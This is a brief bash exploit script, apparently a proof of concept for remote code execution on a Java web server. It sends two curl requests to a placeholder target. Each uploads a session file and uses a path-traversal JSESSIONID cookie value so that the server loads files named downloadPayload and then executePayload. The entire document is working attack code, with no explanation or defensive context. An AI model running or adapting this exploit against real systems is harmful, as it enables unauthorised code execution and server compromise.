#!/bin/bash
curl http://[targetip]:[targetport]/[dir] -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/downloadPayload' -F 'image=@downloadPayload.session'
sleep 1
curl http://[targetip]:[targetport]/[dir] -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload' -F 'image=@executePayload.session'
